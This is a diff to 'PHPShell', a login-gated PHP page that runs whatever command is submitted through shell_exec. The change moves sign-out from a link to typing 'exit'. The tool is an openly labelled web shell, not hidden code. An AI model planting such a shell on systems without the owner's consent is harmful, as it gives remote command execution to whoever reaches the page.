@@ -16,10 +16,7 @@ if (PHPSHELL_ENABLED !== true) {
 
 if ($_SESSION["PHPSHELL"] === true) {
   // The user is logged in
-  if ($_GET["logout"] === "1") {
-    // This is an API request to sign out
-    LOGOUT_USER_API();
-  } elseif (isset($_POST["btn"]) and isset($_POST["data"])) {
+  if (isset($_POST["btn"]) and isset($_POST["data"])) {
     // This is an API request to execute a command
     $data = $_POST["data"];
     EXECUTE_COMMAND_API($data);
@@ -43,6 +40,13 @@ if ($_SESSION["PHPSHELL"] === true) {
 
 function EXECUTE_COMMAND_API($data) {
   // Execute command
+  
+  if ($data === "exit") {
+    // If the user runs exit,
+    // Sign them out
+    LOGOUT_USER_API();
+  }
+  
   $output = shell_exec($data);
   if ($output === false) {
     // Error establishing pipe connection
@@ -101,7 +105,6 @@ function SHOW_SHELL_HTML() {
       <title>PHPShell</title>
     </head>
     <body>
-      <a href="?logout=1">Sign out</a>
       <form method="post">
         <input type="text" name="data" placeholder="Shell command">
         <input type="submit" name="btn" value="Execute">
